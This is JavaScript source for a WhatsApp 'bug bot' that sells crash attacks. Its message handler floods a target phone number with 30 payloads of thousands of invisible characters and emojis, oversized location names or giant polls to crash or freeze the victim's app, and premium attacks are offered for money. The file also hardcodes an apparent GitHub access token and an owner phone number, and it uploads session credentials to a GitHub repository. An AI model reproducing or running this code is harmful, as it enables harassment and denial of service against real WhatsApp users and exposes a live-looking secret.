const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    fetchLatestBaileysVersion,
    generateForwardMessageContent, 
    prepareWAMessageMedia, 
    generateWAMessageFromContent, 
    generateMessageID, 
    downloadContentFromMessage, 
    makeInMemoryStore, 
    jidDecode, 
    proto 
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs-extra");
const path = require("path");
const axios = require("axios");
const express = require("express");

const app = express();
const port = process.env.PORT || 3000;

// --- CONFIGURATION ---
const ownerNumber = "94742271802"; 
const botName = "CHALAH BUG BOT V2";
const logoUrl = 'https://files.catbox.moe/07hh33.png'; 
const voiceUrl = 'https://files.catbox.moe/xk6low.mp4'; 
const GITHUB_TOKEN = "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"; 
const GITHUB_REPO = "btest2619-sudo/Database-Md"; 
const SESSION_BRANCH = "session-data";

let premiumUsers = [ownerNumber]; 

// --- GITHUB SESSION SYNC ---
async function uploadToGitHub(filePath, content) {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
        let sha = null;
        try { 
            const ex = await axios.get(url, { 
                headers: { 'Authorization': `token ${GITHUB_TOKEN}` }, 
                params: { ref: SESSION_BRANCH } 
            }); 
            sha = ex.data.sha; 
        } catch (e) {}
        
        await axios.put(url, { 
            message: `Update ${filePath}`, 
            content: Buffer.from(content).toString('base64'), 
            branch: SESSION_BRANCH, 
            sha: sha || undefined 
        }, { 
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` } 
        });
    } catch (e) {}
}

async function loadSession() {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/session`;
        const res = await axios.get(url, { 
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }, 
            params: { ref: SESSION_BRANCH } 
        });
        if (!fs.existsSync('./session')) fs.mkdirSync('./session');
        for (const f of res.data) {
            const fileRes = await axios.get(f.download_url);
            fs.writeFileSync(`./session/${f.name}`, typeof fileRes.data === 'object' ? JSON.stringify(fileRes.data) : fileRes.data);
        }
    } catch (e) {}
}

// --- START BOT ---
async function startBot() {
    await loadSession();
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const client = makeWASocket({
        auth: state,
        version,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        // PAIRING CODE FIX: නිවැරදි Browser ID එක භාවිතා කිරීම
        browser: ["Ubuntu", "Chrome", "20.0.04"] 
    });

    // Web Panel Routes
    app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
    app.get('/pair', async (req, res) => {
        let num = req.query.number.replace(/[^0-9]/g, '');
        if (!num) return res.json({ error: "Number Required" });
        try {
            await delay(3000); 
            let code = await client.requestPairingCode(num);
            res.json({ code: code });
        } catch (e) {
            res.json({ code: "ERROR" });
        }
    });

    client.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") console.log(`✅ ${botName} CONNECTED!`);
        if (connection === "close") {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) startBot();
        }
    });

    client.ev.on("creds.update", async () => {
        await saveCreds();
        try {
            const files = fs.readdirSync('./session');
            for (const f of files) {
                const content = fs.readFileSync(`./session/${f}`, 'utf-8');
                await uploadToGitHub(`session/${f}`, content);
            }
        } catch (e) {}
    });

    client.ev.on("messages.upsert", async (chat) => {
        const m = chat.messages[0];
        if (!m.message || m.key.fromMe) return;

        const from = m.key.remoteJid;
        const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
        const isCmd = body.startsWith(".");
        const cmd = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : "";
        const args = body.trim().split(" ").slice(1);
        const q = args.join(" ");

        const sender = m.key.participant || m.key.remoteJid;
        const sn = sender.split('@')[0];
        const isPrem = premiumUsers.includes(sn) || sn === ownerNumber;

        // --- STYLISH MENU ---
        if (cmd === 'menu') {
            const menuText = `
╭━━━━〔 *${botName}* 〕━━━━╮
┃ 👤 *USER:* @${sn}
┃ 🏆 *RANK:* ${isPrem ? 'PREMIUM' : 'FREE'}
┃ 🕒 *UPTIME:* ${process.uptime().toFixed(0)}s
╰━━━━━━━━━━━━━━━━━━━━╯

╭━━〔 🛠️ *FREE WEAPONS* 〕━━╮
┃ ⚡ .uicrash
┃ ⚡ .locbomb
┃ ⚡ .pollbug
╰━━━━━━━━━━━━━━━━━━━━╯

╭━━〔 💀 *PREMIUM BUG* 〕━━╮
┃ 🔥 .rip (Hard)
┃ 🔥 .die (Fatal)
┃ 🔥 .404 (System)
┃ 🔥 .end (Destroy)
┃ 🔥 .hell (Infinite)
╰━━━━━━━━━━━━━━━━━━━━╯

*⚠️ WARNING:* Use at your own risk.
_Contact Admin: 0742271802_`;

            await client.sendMessage(from, { 
                image: { url: logoUrl }, 
                caption: menuText,
                mentions: [sender]
            }, { quoted: m });
            
            await client.sendMessage(from, { 
                audio: { url: voiceUrl }, 
                mimetype: 'audio/mp4', 
                ptt: true 
            }, { quoted: m });
        }

        // --- ADVANCED BUG LOGIC ---
        const bugCmds = ['uicrash', 'locbomb', 'pollbug', 'rip', 'die', 'full', 'lag', '404', 'end', 'hell'];
        
        if (bugCmds.includes(cmd)) {
            const premiumOnly = ['rip', 'die', '404', 'end', 'hell'];
            if (premiumOnly.includes(cmd) && !isPrem) {
                return client.sendMessage(from, { text: "⚠️ THIS IS A PREMIUM BUG. CONTACT ADMIN TO BUY (Rs.1000)." }, { quoted: m });
            }

            if (!q) return client.sendMessage(from, { text: "Target Number එක ඇතුළත් කරන්න (e.g .rip 947xxx)" });
            const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

            await client.sendMessage(from, { text: `🚀 *[${cmd.toUpperCase()}] ATTACK STARTED ON ${q}...*` });

            // සර්වර් එකට දරාගත හැකි උපරිම බග් වේගය
            for(let i=0; i<30; i++) { 
                if (cmd === 'locbomb') {
                    await client.sendMessage(target, { location: { degreesLatitude: 24.12, degreesLongitude: 55.11, name: "BOOM".repeat(100) } });
                } else if (cmd === 'pollbug') {
                    await client.sendMessage(target, { poll: { name: '🔥'.repeat(500), values: ['BUG1', 'BUG2'], selectableCount: 1 } });
                } else {
                    // සැර බග් එක (Invisible Character + Unicode)
                    const bugData = "‌".repeat(10000) + "👾".repeat(2000) + "💀".repeat(2000);
                    await client.sendMessage(target, { text: bugData }); 
                }
                await delay(300); 
            }
            await client.sendMessage(from, { text: `✅ *[${cmd.toUpperCase()}] ATTACK COMPLETED!*` });
        }
    });
}

app.listen(port, () => console.log(`Server is live on port ${port}`));
startBot();
